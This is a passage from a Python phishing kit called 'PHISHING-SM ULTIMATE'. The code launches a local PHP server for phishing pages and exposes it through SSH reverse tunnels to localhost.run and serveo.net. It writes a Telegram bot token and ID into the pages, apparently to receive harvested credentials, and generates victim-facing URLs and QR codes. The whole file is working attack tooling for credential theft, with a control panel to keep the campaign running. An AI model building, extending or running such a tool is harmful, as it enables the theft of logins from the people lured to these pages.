        self.print_color(f"{Colors.YELLOW}[+] Starting TMUX: {cmd}{Colors.NC}")
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            self.print_color(f"{Colors.RED}[-] Failed to create TMUX session{Colors.NC}")
            return False
        
        time.sleep(3)
        
        # Monitor for tunnel URL
        return self.monitor_tunnel_url(timeout=30)

    def start_ssh_tunnel_background(self):
        """Enhanced background process SSH tunnel"""
        self.print_color(f"{Colors.GREEN}[+] Using background process tunnel...{Colors.NC}")
        
        ssh_cmd = self.build_ssh_command()
        timestamp = str(int(time.time()))
        log_file = f"ssh_tunnel_{timestamp}.log"
        
        try:
            with open(log_file, 'w') as log:
                process = subprocess.Popen(
                    ssh_cmd,
                    shell=True,
                    stdout=log,
                    stderr=subprocess.STDOUT,
                    preexec_fn=os.setsid
                )
                self.ssh_pid = process.pid
            
            self.print_color(f"{Colors.GREEN}[+] SSH tunnel started with PID: {self.ssh_pid}{Colors.NC}")
            
            # Monitor for tunnel URL
            return self.monitor_tunnel_url(log_file=log_file, timeout=30)
            
        except Exception as e:
            self.print_color(f"{Colors.RED}[-] Failed to start SSH tunnel: {str(e)}{Colors.NC}")
            return False

    def start_ssh_tunnel_direct(self):
        """Direct SSH tunnel without background process"""
        self.print_color(f"{Colors.GREEN}[+] Using direct SSH tunnel...{Colors.NC}")
        
        ssh_cmd = self.build_ssh_command()
        self.print_color(f"{Colors.YELLOW}[+] Executing: {ssh_cmd}{Colors.NC}")
        
        try:
            process = subprocess.Popen(
                ssh_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            self.ssh_pid = process.pid
            
            # Start output monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_ssh_output, args=(process,))
            monitor_thread.daemon = True
            monitor_thread.start()
            
            return self.monitor_tunnel_url(process=process, timeout=30)
            
        except Exception as e:
            self.print_color(f"{Colors.RED}[-] Direct SSH tunnel failed: {str(e)}{Colors.NC}")
            return False

    def build_ssh_command(self):
        """Build SSH command with optimal parameters"""
        base_cmd = "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3"
        
        # Add identity file if available
        if Path("id_rsa").exists():
            base_cmd += " -i id_rsa"
        
        # Try different tunnel providers
        tunnel_targets = [
            f" -R 80:localhost:{self.php_port} ssh.localhost.run",
            f" -R 80:localhost:{self.php_port} serveo.net",
            f" -R 80:localhost:{self.php_port} nokey@localhost.run"
        ]
        
        return base_cmd + tunnel_targets[0]  # Start with localhost.run

    def monitor_tunnel_url(self, process=None, log_file=None, timeout=30):
        """Monitor for tunnel URL with enhanced detection"""
        self.print_color(f"{Colors.CYAN}[+] Monitoring for tunnel URL (timeout: {timeout}s)...{Colors.NC}")
        
        start_time = time.time()
        url_patterns = [
            r'https://[a-zA-Z0-9-]+\.lhr\.life',
            r'https://[a-zA-Z0-9-]+\.serveo\.net',
            r'https://[a-zA-Z0-9-]+\.ngrok\.io',
            r'https://[a-zA-Z0-9-]+\.[a-z]+\.([a-z]+\.)?[a-z]+'
        ]
        
        while time.time() - start_time < timeout:
            url_found = False
            
            # Check TMUX output
            if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
                result = subprocess.run("tmux capture-pane -t phishing-tunnel -p", shell=True, capture_output=True, text=True)
                url_found = self.extract_url_from_output(result.stdout, url_patterns)
            
            # Check log file
            if not url_found and log_file and Path(log_file).exists():
                with open(log_file, 'r') as f:
                    url_found = self.extract_url_from_output(f.read(), url_patterns)
            
            # Check process output
            if not url_found and process and process.poll() is None:
                try:
                    output = process.stdout.readline()
                    if output:
                        url_found = self.extract_url_from_output(output, url_patterns)
                except:
                    pass
            
            if url_found:
                self.print_color(f"{Colors.GREEN}[✓] SSH tunnel established successfully!{Colors.NC}")
                self.print_color(f"{Colors.GREEN}[+] Tunnel URL: {self.tunnel_url}{Colors.NC}")
                
                # Save URL and test
                with open('current_tunnel.url', 'w') as f:
                    f.write(self.tunnel_url)
                
                self.test_tunnel_url()
                return True
            
            time.sleep(2)
            elapsed = int(time.time() - start_time)
            self.print_color(f"{Colors.YELLOW}[!] Waiting for tunnel... ({elapsed}/{timeout}s){Colors.NC}")
        
        self.print_color(f"{Colors.RED}[-] Tunnel URL not found within timeout{Colors.NC}")
        return False

    def extract_url_from_output(self, output, patterns):
        """Extract URL from output using multiple patterns"""
        for pattern in patterns:
            match = re.search(pattern, output)
            if match:
                self.tunnel_url = match.group()
                return True
        return False

    def monitor_ssh_output(self, process):
        """Monitor SSH process output"""
        try:
            while process.poll() is None:
                line = process.stdout.readline()
                if line:
                    self.log_event(f"SSH: {line.strip()}", "DEBUG")
                time.sleep(0.1)
        except:
            pass

    def test_tunnel_url(self):
        """Enhanced tunnel URL testing"""
        self.print_color(f"{Colors.CYAN}[+] Testing tunnel URL accessibility...{Colors.NC}")
        
        if not self.tunnel_url:
            self.print_color(f"{Colors.RED}[-] No tunnel URL to test{Colors.NC}")
            return
        
        try:
            response = requests.get(self.tunnel_url, timeout=10)
            if response.status_code == 200:
                self.print_color(f"{Colors.GREEN}[✓] Tunnel URL is accessible from internet{Colors.NC}")
            else:
                self.print_color(f"{Colors.YELLOW}[!] Tunnel URL returned status {response.status_code}{Colors.NC}")
        except requests.exceptions.Timeout:
            self.print_color(f"{Colors.YELLOW}[!] Tunnel URL test timed out{Colors.NC}")
        except Exception as e:
            self.print_color(f"{Colors.YELLOW}[!] Tunnel URL test failed: {str(e)}{Colors.NC}")

    def is_process_running(self, pid):
        """Enhanced process running check"""
        try:
            os.kill(pid, 0)
            return True
        except (ProcessLookupError, PermissionError):
            return False

    def generate_enhanced_url(self):
        """Enhanced URL generation with multiple formats"""
        if not self.tunnel_url:
            self.print_color(f"{Colors.RED}[-] No tunnel URL available{Colors.NC}")
            return False
        
        # Generate multiple URL formats
        base_url = f"{self.tunnel_url}/{self.selected_page}"
        url_variants = [
            f"{base_url}?ID={self.user_id}",
            f"{base_url}?id={self.user_id}",
            f"{base_url}?user={self.user_id}",
            f"{base_url}?telegram={self.user_id}",
            base_url  # Fallback without parameters
        ]
        
        final_url = url_variants[0]  # Primary URL
        
        self.print_color(f"{Colors.BG_GREEN}{Colors.WHITE}══════════════════════════ ENHANCED URL GENERATION ═══════════════════════════{Colors.NC}")
        self.print_color(f"{Colors.GREEN}[+] Primary URL: {Colors.WHITE}{final_url}{Colors.NC}")
        
        # Save all URL variants
        with open('generated_urls.txt', 'w') as f:
            for url in url_variants:
                f.write(url + '\n')
        
        with open('generated_url.txt', 'w') as f:
            f.write(final_url)
        
        # Test URL accessibility
        self.test_final_url(final_url)
        
        # Generate QR code
        self.generate_qr_code(final_url)
        
        # Show URL shortening options
        self.show_url_options(final_url)
        
        return True

    def test_final_url(self, url):
        """Enhanced final URL testing"""
        self.print_color(f"{Colors.CYAN}[+] Testing final URL comprehensively...{Colors.NC}")
        
        tests = [
            ("Basic accessibility", lambda: requests.get(url, timeout=10)),
            ("Without parameters", lambda: requests.get(url.split('?')[0], timeout=10)),
            ("Head request", lambda: requests.head(url, timeout=5))
        ]
        
        for test_name, test_func in tests:
            try:
                response = test_func()
                status_icon = f"{Colors.GREEN}✓{Colors.NC}" if response.status_code == 200 else f"{Colors.YELLOW}⚠{Colors.NC}"
                self.print_color(f"  {status_icon} {test_name}: HTTP {response.status_code}")
            except Exception as e:
                self.print_color(f"  {Colors.RED}✗{Colors.NC} {test_name}: {str(e)}")

    def generate_qr_code(self, url):
        """Enhanced QR code generation"""
        self.print_color(f"{Colors.CYAN}[+] Generating QR code...{Colors.NC}")
        
        # Try multiple QR code methods
        qr_methods = [
            ("qrencode", f"qrencode -t ANSIUTF8 '{url}'"),
            ("python_qrcode", "python3 -c \"import qrcode; qr = qrcode.QRCode(); qr.add_data('" + url + "'); qr.print_ascii()\" 2>/dev/null"),
        ]
        
        qr_generated = False
        for method_name, command in qr_methods:
            try:
                if method_name == "qrencode" and self.check_command_exists("qrencode"):
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        print(result.stdout)
                        qr_generated = True
                        break
                elif method_name == "python_qrcode":
                    try:
                        import qrcode
                        qr = qrcode.QRCode()
                        qr.add_data(url)
                        qr.print_ascii()
                        qr_generated = True
                        break
                    except ImportError:
                        continue
            except:
                continue
        
        if not qr_generated:
            self.print_color(f"{Colors.YELLOW}[!] QR code generation not available{Colors.NC}")
            self.print_color(f"{Colors.YELLOW}[!] Install: pip install qrcode OR apt install qrencode{Colors.NC}")

    def show_url_options(self, url):
        """Show URL shortening and sharing options"""
        self.print_color(f"{Colors.CYAN}[+] URL Management Options:{Colors.NC}")
        options = [
            f"{Colors.GREEN}1.{Colors.WHITE} Copy to clipboard (if xclip/xsel available)",
            f"{Colors.GREEN}2.{Colors.WHITE} Save to file: generated_url.txt",
            f"{Colors.GREEN}3.{Colors.WHITE} All variants: generated_urls.txt",
            f"{Colors.GREEN}4.{Colors.WHITE} Share via QR code (above)"
        ]
        
        for option in options:
            print(f"  {option}")

    def display_enhanced_results(self):
        """Enhanced results display with comprehensive status"""
        self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ ENHANCED STATUS PANEL ═══════════════════════════{Colors.NC}")
        
        status_items = [
            (f"{Colors.GREEN}[✓] Bot Token", f"{Colors.WHITE}Configured and validated{Colors.NC}"),
            (f"{Colors.GREEN}[✓] Telegram ID", f"{Colors.WHITE}{self.user_id}{Colors.NC}"),
            (f"{Colors.GREEN}[✓] Selected Page", f"{Colors.WHITE}{self.selected_page}{Colors.NC}"),
            (f"{Colors.GREEN}[✓] PHP Server", f"{Colors.WHITE}Port {self.php_port} (PID: {self.php_pid}){Colors.NC}" if self.php_pid else f"{Colors.RED}Not running{Colors.NC}"),
        ]
        
        for label, value in status_items:
            print(f"{label}: {value}")
        
        # Tunnel status
        if self.tunnel_url:
            print(f"{Colors.GREEN}[✓] Tunnel URL: {Colors.WHITE}{self.tunnel_url}{Colors.NC}")
        
        # SSH tunnel status
        if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
            print(f"{Colors.GREEN}[✓] SSH Tunnel: {Colors.WHITE}Running in TMUX session{Colors.NC}")
        elif self.ssh_pid and self.is_process_running(self.ssh_pid):
            print(f"{Colors.GREEN}[✓] SSH Tunnel: {Colors.WHITE}Running (PID: {self.ssh_pid}){Colors.NC}")
        else:
            print(f"{Colors.RED}[-] SSH Tunnel: {Colors.WHITE}Not running{Colors.NC}")
        
        # URL status
        if Path('generated_url.txt').exists():
            with open('generated_url.txt', 'r') as f:
                final_url = f.read().strip()
            print(f"{Colors.GREEN}[✓] Phishing URL: {Colors.WHITE}{final_url}{Colors.NC}")
        
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")

    def interactive_control_panel(self):
        """Enhanced interactive control panel with real-time monitoring"""
        self.print_color(f"\n{Colors.YELLOW}[!] Starting enhanced interactive control panel...{Colors.NC}")
        self.print_color(f"{Colors.GREEN}[+] Services are now active and monitored{Colors.NC}")
        
        # Start monitoring threads
        self.start_service_monitors()
        
        # Display control options
        while True:
            self.display_control_menu()
            
            try:
                choice = input(f"\n{Colors.GREEN}[CONTROL] Enter command: {Colors.NC}").strip().lower()
                
                if choice in ['q', 'quit', 'exit']:
                    self.print_color(f"{Colors.YELLOW}[!] Stopping services...{Colors.NC}")
                    break
                
                self.handle_control_command(choice)
                
                # Check if services are still running
                if not self.are_services_healthy():
                    self.print_color(f"{Colors.RED}[!] Services are not healthy, restarting...{Colors.NC}")
                    self.restart_services()
                
            except (KeyboardInterrupt, EOFError):
                self.print_color(f"\n{Colors.YELLOW}[!] Control panel interrupted{Colors.NC}")
                break
            except Exception as e:
                self.print_color(f"{Colors.RED}[ERROR] Control command failed: {str(e)}{Colors.NC}")
        
        self.stop_service_monitors()

    def display_control_menu(self):
        """Display enhanced control menu"""
        menu = f"""
{Colors.BG_CYAN}{Colors.WHITE} ENHANCED CONTROL PANEL {Colors.NC}

{Colors.GREEN}Service Control:{Colors.NC}
  {Colors.GREEN}[q]{Colors.WHITE} Quit and stop all services
  {Colors.GREEN}[r]{Colors.WHITE} Restart all services
  {Colors.GREEN}[s]{Colors.WHITE} Service status
  {Colors.GREEN}[t]{Colors.WHITE} Test URL accessibility

{Colors.GREEN}Monitoring:{Colors.NC}
  {Colors.GREEN}[l]{Colors.WHITE} View PHP server logs
  {Colors.GREEN}[ssh]{Colors.WHITE} View SSH tunnel logs
  {Colors.GREEN}[tmux]{Colors.WHITE} Attach to TMUX session

{Colors.GREEN}URL Management:{Colors.NC}
  {Colors.GREEN}[u]{Colors.WHITE} Show generated URL
  {Colors.GREEN}[qr]{Colors.WHITE} Regenerate QR code
  {Colors.GREEN}[c]{Colors.WHITE} Copy URL to clipboard

{Colors.GREEN}Debugging:{Colors.NC}
  {Colors.GREEN}[d]{Colors.WHITE} Debug information
  {Colors.GREEN}[h]{Colors.WHITE} Health check
  {Colors.GREEN}[log]{Colors.WHITE} View system log
"""
        print(menu)

    def handle_control_command(self, command):
        """Handle control panel commands"""
        command_handlers = {
            'r': self.restart_services,
            's': self.show_service_status,
            't': self.test_url_accessibility,
            'l': self.view_php_logs,
            'ssh': self.view_ssh_logs,
            'tmux': self.attach_tmux_session,
            'u': self.show_generated_url,
            'qr': self.regenerate_qr_code,
            'c': self.copy_url_to_clipboard,
            'd': self.show_debug_info,
            'h': self.health_check,
            'log': self.view_system_log
        }
        
        handler = command_handlers.get(command)
        if handler:
            handler()
        else:
            self.print_color(f"{Colors.RED}[!] Unknown command: {command}{Colors.NC}")

    def start_service_monitors(self):
        """Start background service monitors"""
        self.monitoring = True
        self.monitor_thread = threading.Thread(target=self.service_monitor_loop)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()

    def service_monitor_loop(self):
        """Background service monitoring loop"""
        while getattr(self, 'monitoring', False):
            try:
                if not self.are_services_healthy():
                    self.log_event("Service health check failed", "WARNING")
                time.sleep(10)
            except:
                pass

    def stop_service_monitors(self):
        """Stop background monitors"""
        self.monitoring = False

    def are_services_healthy(self):
        """Check if all services are healthy"""
        try:
            # Check PHP server
            if not self.php_pid or not self.is_process_running(self.php_pid):
                return False
            
            # Check PHP server responsiveness
            response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=5)
            if response.status_code != 200:
                return False
            
            # Check SSH tunnel
            if self.check_command_exists('tmux'):
                if subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode != 0:
                    return False
            elif self.ssh_pid and not self.is_process_running(self.ssh_pid):
                return False
            
            return True
            
        except:
            return False

    def restart_services(self):
        """Restart all services"""
        self.print_color(f"{Colors.YELLOW}[!] Restarting all services...{Colors.NC}")
        self.stop_services_enhanced()
        time.sleep(2)
        
        if self.start_php_server_enhanced() and self.start_ssh_tunnel_enhanced():
            self.generate_enhanced_url()
            self.display_enhanced_results()
            self.print_color(f"{Colors.GREEN}[✓] Services restarted successfully{Colors.NC}")
        else:
            self.print_color(f"{Colors.RED}[-] Failed to restart services{Colors.NC}")

    def show_service_status(self):
        """Show detailed service status"""
        self.print_color(f"{Colors.CYAN}[+] Service Status:{Colors.NC}")
        
        # PHP Server status
        php_status = f"{Colors.GREEN}Running{Colors.NC}" if self.php_pid and self.is_process_running(self.php_pid) else f"{Colors.RED}Stopped{Colors.NC}"
        print(f"  PHP Server: {php_status} (PID: {self.php_pid})")
        
        # SSH Tunnel status
        if self.check_command_exists('tmux') and subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0:
            print(f"  SSH Tunnel: {Colors.GREEN}Running in TMUX{Colors.NC}")
        elif self.ssh_pid and self.is_process_running(self.ssh_pid):
            print(f"  SSH Tunnel: {Colors.Green}Running{Colors.NC} (PID: {self.ssh_pid})")
        else:
            print(f"  SSH Tunnel: {Colors.RED}Stopped{Colors.NC}")
        
        # URL status
        if Path('generated_url.txt').exists():
            with open('generated_url.txt', 'r') as f:
                url = f.read().strip()
            print(f"  Phishing URL: {Colors.GREEN}Active{Colors.NC}")
            print(f"  URL: {url}")

    def test_url_accessibility(self):
        """Test URL accessibility"""
        if not Path('generated_url.txt').exists():
            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
            return
        
        with open('generated_url.txt', 'r') as f:
            url = f.read().strip()
        
        self.print_color(f"{Colors.CYAN}[+] Testing URL: {url}{Colors.NC}")
        
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                self.print_color(f"{Colors.GREEN}[✓] URL is accessible (HTTP 200){Colors.NC}")
            else:
                self.print_color(f"{Colors.YELLOW}[!] URL returned HTTP {response.status_code}{Colors.NC}")
        except Exception as e:
            self.print_color(f"{Colors.RED}[-] URL test failed: {str(e)}{Colors.NC}")

    def view_php_logs(self):
        """View PHP server logs"""
        log_files = ['php_server.log'] + list(Path('.').glob('php_*.log'))
        
        for log_file in log_files:
            if Path(log_file).exists():
                self.print_color(f"{Colors.CYAN}[+] PHP Log ({log_file}):{Colors.NC}")
                with open(log_file, 'r') as f:
                    lines = f.readlines()[-20:]  # Last 20 lines
                    for line in lines:
                        print(f"  {line.strip()}")
                return
        
        self.print_color(f"{Colors.YELLOW}[!] No PHP log files found{Colors.NC}")

    def view_ssh_logs(self):
        """View SSH tunnel logs"""
        log_files = list(Path('.').glob('ssh_tunnel_*.log'))
        
        if log_files:
            latest_log = max(log_files, key=lambda x: x.stat().st_mtime)
            self.print_color(f"{Colors.CYAN}[+] SSH Log ({latest_log}):{Colors.NC}")
            with open(latest_log, 'r') as f:
                lines = f.readlines()[-15:]  # Last 15 lines
                for line in lines:
                    print(f"  {line.strip()}")
        else:
            self.print_color(f"{Colors.YELLOW}[!] No SSH log files found{Colors.NC}")

    def attach_tmux_session(self):
        """Attach to TMUX session"""
        if not self.check_command_exists('tmux'):
            self.print_color(f"{Colors.RED}[-] TMUX not available{Colors.NC}")
            return
        
        if subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode != 0:
            self.print_color(f"{Colors.RED}[-] No TMUX session found{Colors.NC}")
            return
        
        self.print_color(f"{Colors.CYAN}[+] Attaching to TMUX session...{Colors.NC}")
        self.print_color(f"{Colors.YELLOW}[!] To detach: Ctrl+B, then D{Colors.NC}")
        subprocess.run("tmux attach -t phishing-tunnel", shell=True)

    def show_generated_url(self):
        """Show generated URL"""
        if not Path('generated_url.txt').exists():
            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
            return
        
        with open('generated_url.txt', 'r') as f:
            url = f.read().strip()
        
        self.print_color(f"{Colors.GREEN}[+] Generated URL: {url}{Colors.NC}")

    def regenerate_qr_code(self):
        """Regenerate QR code"""
        if not Path('generated_url.txt').exists():
            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
            return
        
        with open('generated_url.txt', 'r') as f:
            url = f.read().strip()
        
        self.generate_qr_code(url)

    def copy_url_to_clipboard(self):
        """Copy URL to clipboard"""
        if not Path('generated_url.txt').exists():
            self.print_color(f"{Colors.RED}[-] No URL generated{Colors.NC}")
            return
        
        with open('generated_url.txt', 'r') as f:
            url = f.read().strip()
        
        # Try different clipboard methods
        clipboard_commands = [
            f"echo '{url}' | xclip -selection clipboard",  # Linux with xclip
            f"echo '{url}' | xsel --clipboard --input",    # Linux with xsel
            f"echo '{url}' | pbcopy",                      # macOS
            f"echo '{url}' | clip",                        # Windows
        ]
        
        for cmd in clipboard_commands:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True)
                if result.returncode == 0:
                    self.print_color(f"{Colors.GREEN}[✓] URL copied to clipboard{Colors.NC}")
                    return
            except:
                continue
        
        self.print_color(f"{Colors.YELLOW}[!] Could not copy to clipboard{Colors.NC}")
        self.print_color(f"{Colors.YELLOW}[!] Install xclip or xsel on Linux{Colors.NC}")

    def show_debug_info(self):
        """Show debug information"""
        self.print_color(f"{Colors.CYAN}[+] Debug Information:{Colors.NC}")
        print(f"  PHP PID: {self.php_pid}")
        print(f"  SSH PID: {self.ssh_pid}")
        print(f"  PHP Port: {self.php_port}")
        print(f"  Tunnel URL: {self.tunnel_url}")
        print(f"  Selected Page: {self.selected_page}")
        print(f"  User ID: {self.user_id}")
        print(f"  Token: {'*' * 10}{self.current_token[-4:] if self.current_token else 'None'}")
        print(f"  System: {sys.platform}")
        print(f"  Termux: {self.is_termux}")
        print(f"  Kali: {self.is_kali}")

    def health_check(self):
        """Perform health check"""
        self.print_color(f"{Colors.CYAN}[+] Performing health check...{Colors.NC}")
        
        checks = [
            ("PHP Server Process", self.php_pid and self.is_process_running(self.php_pid)),
            ("SSH Tunnel Process", self.ssh_pid and self.is_process_running(self.ssh_pid) or 
             (self.check_command_exists('tmux') and 
              subprocess.run("tmux has-session -t phishing-tunnel 2>/dev/null", shell=True).returncode == 0)),
            ("PHP Server Responsive", self.test_php_responsive()),
            ("Tunnel URL Accessible", self.test_tunnel_accessible()),
            ("Generated URL File", Path('generated_url.txt').exists())
        ]
        
        all_healthy = True
        for check_name, status in checks:
            status_icon = f"{Colors.GREEN}✓{Colors.NC}" if status else f"{Colors.RED}✗{Colors.NC}"
            status_text = f"{Colors.GREEN}Healthy{Colors.NC}" if status else f"{Colors.RED}Unhealthy{Colors.NC}"
            print(f"  {status_icon} {check_name}: {status_text}")
            if not status:
                all_healthy = False
        
        if all_healthy:
            self.print_color(f"{Colors.GREEN}[✓] All systems healthy{Colors.NC}")
        else:
            self.print_color(f"{Colors.YELLOW}[!] Some systems need attention{Colors.NC}")

    def test_php_responsive(self):
        """Test PHP server responsiveness"""
        try:
            response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=5)
            return response.status_code == 200
        except:
            return False

    def test_tunnel_accessible(self):
        """Test tunnel accessibility"""
        if not self.tunnel_url:
            return False
        
        try:
            response = requests.get(self.tunnel_url, timeout=10)
            return response.status_code == 200
        except:
            return False

    def view_system_log(self):
        """View system log"""
        if not Path(self.log_file).exists():
            self.print_color(f"{Colors.YELLOW}[!] No system log found{Colors.NC}")
            return
        
        self.print_color(f"{Colors.CYAN}[+] System Log:{Colors.NC}")
        with open(self.log_file, 'r') as f:
            lines = f.readlines()[-30:]  # Last 30 lines
            for line in lines:
                print(f"  {line.strip()}")

    def cleanup(self):
        """Enhanced cleanup with comprehensive resource management"""
        self.print_color(f"\n{Colors.RED}[!] Performing enhanced cleanup...{Colors.NC}")
        
        # Stop all services
        self.stop_services_enhanced()
        
        # Revert token
        if self.current_token:
            self.print_color(f"{Colors.YELLOW}[!] Reverting token in PHP files...{Colors.NC}")
            self.revert_token()
        
        # Stop monitoring
        self.stop_service_monitors()
        
        # Cleanup temporary files
        temp_files = [
            'current_tunnel.url', 'generated_url.txt', 'generated_urls.txt',
            'php_server.log', 'php_server.pid', 'ssh_tunnel.pid',
            self.session_file
        ]
        
        for temp_file in temp_files:
            if Path(temp_file).exists():
                try:
                    Path(temp_file).unlink()
                    self.print_color(f"{Colors.GREEN}[✓] Removed: {temp_file}{Colors.NC}")
                except:
                    self.print_color(f"{Colors.YELLOW}[!] Failed to remove: {temp_file}{Colors.NC}")
        
        # Cleanup log files
        for log_file in Path('.').glob('ssh_tunnel_*.log'):
            try:
                log_file.unlink()
            except:
                pass
        
        # Final verification
        if self.current_token:
            # Verify token is removed
            token_found = False
            for php_file in Path('.').glob('*.php'):
                try:
                    with open(php_file, 'r') as f:
                        if self.current_token in f.read():
                            token_found = True
                            break
                except:
                    pass
            
            if not token_found:
                self.print_color(f"{Colors.GREEN}[✓] Token successfully removed from all files{Colors.NC}")
            else:
                self.print_color(f"{Colors.RED}[-] Token still found in some files{Colors.NC}")
        
        self.print_color(f"{Colors.GREEN}[✓] Enhanced cleanup completed successfully{Colors.NC}")
        self.print_color(f"{Colors.CYAN}[+] Thank you for using PHISHING-SM ULTIMATE{Colors.NC}")

    def main_loop(self):
        """Enhanced main loop with session management"""
        self.print_banner()
        
        # System compatibility announcement
        if self.is_termux:
            self.print_color(f"{Colors.GREEN}[+] Running in Termux environment{Colors.NC}")
        if self.is_kali:
            self.print_color(f"{Colors.GREEN}[+] Running in Kali Linux{Colors.NC}")
        
        # Check for PHP files
        php_files = list(Path('.').glob('*.php'))
        if not php_files:
            self.print_color(f"{Colors.RED}[ERROR] No PHP files found in current directory!{Colors.NC}")
            self.print_color(f"{Colors.YELLOW}[!] Please ensure you're in the correct directory{Colors.NC}")
            self.print_color(f"{Colors.YELLOW}[!] The tool requires PHP phishing pages{Colors.NC}")
            sys.exit(1)
        
        # Enhanced dependency check
        self.print_color(f"{Colors.CYAN}[+] Starting enhanced dependency check...{Colors.NC}")
        if not self.check_dependencies():
            self.print_color(f"{Colors.RED}[ERROR] Critical dependencies missing{Colors.NC}")
            if not self.is_termux:
                self.print_color(f"{Colors.YELLOW}[!] Try: sudo apt update && sudo apt install php ssh curl{Colors.NC}")
            else:
                self.print_color(f"{Colors.YELLOW}[!] Try: pkg update && pkg install php openssh curl{Colors.NC}")
            sys.exit(1)
        
        # Check for SSH key
        if not Path("id_rsa").exists():
            self.print_color(f"{Colors.YELLOW}[!] SSH key (id_rsa) not found{Colors.NC}")
            self.print_color(f"{Colors.YELLOW}[!] Using password authentication for tunnels{Colors.NC}")
        
        # Main interaction loop
        while True:
            try:
                # Token setup
                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ BOT TOKEN SETUP ═════════════════════════{Colors.NC}")
                
                if self.current_token:
                    use_previous = input(f"{Colors.YELLOW}[?] Use previous token? [{self.current_token[:10]}...] (y/n): {Colors.NC}").strip().lower()
                    if use_previous in ['y', 'yes', '']:
                        self.print_color(f"{Colors.GREEN}[+] Using previous token{Colors.NC}")
                    else:
                        self.current_token = ""
                
                if not self.current_token:
                    while True:
                        bot_token = input(f"{Colors.YELLOW}[+] Enter Bot Token: {Colors.NC}").strip()
                        if self.validate_token(bot_token):
                            self.current_token = bot_token
                            self.save_session()
                            break
                
                # User ID setup
                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TELEGRAM ID SETUP ════════════════════════{Colors.NC}")
                
                if self.user_id:
                    use_previous = input(f"{Colors.YELLOW}[?] Use previous ID? [{self.user_id}] (y/n): {Colors.NC}").strip().lower()
                    if use_previous in ['y', 'yes', '']:
                        self.print_color(f"{Colors.GREEN}[+] Using previous ID{Colors.NC}")
                    else:
                        self.user_id = ""
                
                if not self.user_id:
                    while True:
                        user_id = input(f"{Colors.YELLOW}[+] Enter Your Telegram ID: {Colors.NC}").strip()
                        if self.validate_id(user_id):
                            self.user_id = user_id
                            self.save_session()
                            break
                
                # Token replacement
                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TOKEN REPLACEMENT ════════════════════════{Colors.NC}")
                self.search_and_replace_token(self.current_token)
                
                # Page selection
                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ PAGE SELECTION ══════════════════════════{Colors.NC}")
                self.show_enhanced_pages_menu()
                
                while True:
                    choice = input(f"{Colors.YELLOW}[+] Choose page [01-25, 00=help, 26=exit]: {Colors.NC}").strip()
                    
                    if choice == '00':
                        self.show_help()
                        self.show_enhanced_pages_menu()
                        continue
                    elif choice == '26':
                        self.print_color(f"{Colors.RED}[!] Exiting...{Colors.NC}")
                        self.cleanup()
                        sys.exit(0)
                    elif choice == '99':
                        self.show_enhanced_pages_menu()
                        continue
                    elif choice in self.pages:
                        self.selected_page = self.pages[choice]["file"]
                        break
                    else:
                        self.print_color(f"{Colors.RED}[-] Invalid choice!{Colors.NC}")
                
                # Verify page exists
                if not Path(self.selected_page).exists():
                    self.print_color(f"{Colors.RED}[-] Page '{self.selected_page}' not found!{Colors.NC}")
                    self.print_color(f"{Colors.YELLOW}[!] Available pages:{Colors.NC}")
                    for php_file in php_files:
                        self.print_color(f"  - {php_file}", Colors.WHITE)
                    continue
                
                self.print_color(f"{Colors.GREEN}[+] Selected: {self.pages[choice]['name']} ({self.selected_page}){Colors.NC}")
                
                # Service management
                self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ SERVICE MANAGEMENT ════════════════════════{Colors.NC}")
                
                self.stop_services_enhanced()
                
                if self.start_php_server_enhanced() and self.start_ssh_tunnel_enhanced():
                    if self.generate_enhanced_url():
                        self.display_enhanced_results()
                        self.interactive_control_panel()
                else:
                    self.print_color(f"{Colors.RED}[ERROR] Failed to start services{Colors.NC}")
                    retry = input(f"{Colors.YELLOW}[?] Retry? (y/n): {Colors.NC}").strip().lower()
                    if retry not in ['y', 'yes']:
                        break
            
            except KeyboardInterrupt:
                self.print_color(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.NC}")
                break
            except Exception as e:
                self.print_color(f"{Colors.RED}[ERROR] Unexpected error: {str(e)}{Colors.NC}")
                self.log_event(f"Main loop error: {str(e)}", "ERROR")
                continue

def main():
    """Main entry point with enhanced error handling"""
    try:
        tool = AdvancedPhishingTool()
        tool.main_loop()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Tool interrupted by user{Colors.NC}")
    except Exception as e:
        print(f"{Colors.RED}[CRITICAL ERROR] {str(e)}{Colors.NC}")
        print(f"{Colors.YELLOW}[!] Please check the log file: phishing_debug.log{Colors.NC}")
    finally:
        # Ensure cleanup happens
        if 'tool' in locals():
            tool.cleanup()

if __name__ == "__main__":
    main()
